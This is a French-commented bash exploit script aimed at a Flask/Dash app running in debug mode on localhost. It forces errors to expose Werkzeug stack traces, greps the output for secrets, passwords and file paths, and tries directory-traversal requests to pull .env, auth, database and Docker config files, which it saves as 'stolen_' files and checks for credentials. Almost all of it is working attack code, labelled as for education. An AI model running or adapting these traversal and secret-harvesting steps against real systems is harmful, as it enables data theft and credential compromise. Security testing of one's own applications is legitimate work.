#!/bin/bash
# Exploitation de Flask Debug Mode - Education seulement !

echo "üé≠ Exploitation Flask Debug Mode"
echo "=================================="

# 1. Forcer des erreurs pour exposer des stack traces avec infos sensibles
echo "[1] Tentatives d'erreurs pour exposer le debugger..."

# Erreur de typage
curl -s "http://localhost:8050/api/product/INVALID_ID" > error1.html

# Erreur de route invalide
curl -s "http://localhost:8050/../../../../etc/passwd" > error2.html

# Payload malform√©
curl -s -X POST "http://localhost:8050/api/data" \
  -H "Content-Type: application/json" \
  -d '{invalid json}' > error3.html

# 2. Extraire les informations sensibles des stack traces
echo "[2] Analyse des stack traces..."

for file in error*.html; do
    if grep -q "SECRET" "$file"; then
        echo "‚úÖ SECRET trouv√© dans $file"
        grep -A 2 "SECRET" "$file"
    fi
    
    if grep -q "password" "$file"; then
        echo "üö® Mot de passe trouv√© dans $file"
        grep -A 2 "password" "$file"
    fi
    
    if grep -q "/app/" "$file"; then
        echo "üìÅ Chemins de fichiers expos√©s dans $file:"
        grep -o "/app/[^\"<>]*" "$file" | sort -u
    fi
done

# 3. Tentative d'acc√®s aux fichiers via les chemins d√©couverts
echo ""
echo "[3] Tentative d'acc√®s aux fichiers d√©couverts..."

# Fichiers communs √† essayer
files=(
    "dashboard/users.json"
    "dashboard/db.py"
    "dashboard/auth.py"
    "dashboard/app.py"
    "docker-compose.secure.yml"
    ".env"
    "config.py"
    "requirements.txt"
)

for file in "${files[@]}"; do
    # Essayer plusieurs m√©thodes
    curl -s "http://localhost:8050/../$file" -o "stolen_$file" 2>/dev/null
    curl -s "http://localhost:8050/assets/../../$file" -o "stolen_$file" 2>/dev/null
    curl -s "http://localhost:8050/_dash-component-suites/../../../$file" -o "stolen_$file" 2>/dev/null
    
    if [ -f "stolen_$file" ] && [ $(wc -c < "stolen_$file") -gt 50 ]; then
        echo "‚úÖ R√©cup√©r√©: $file ($(wc -c < "stolen_$file") bytes)"
        
        # Chercher des credentials
        if grep -qi "password\|secret\|key\|token\|credential" "stolen_$file" 2>/dev/null; then
            echo "   üî¥ CONTIENT DES CREDENTIALS!"
        fi
    fi
done

echo ""
echo "=================================="
echo "üìä R√©sum√© de l'exploitation"
echo "=================================="
ls -lh stolen_* error*.html 2>/dev/null | tail -20

echo ""
echo "üö® VULN√âRABILIT√âS CRITIQUES IDENTIFI√âES:"
echo "1. Flask Debug Mode activ√© en production"
echo "2. Werkzeug Debugger expos√© (RCE possible)"
echo "3. Stack traces r√©v√©lant l'architecture"
echo "4. Paths de fichiers expos√©s"
echo "5. Potentiellement: SECRET keys expos√©s"
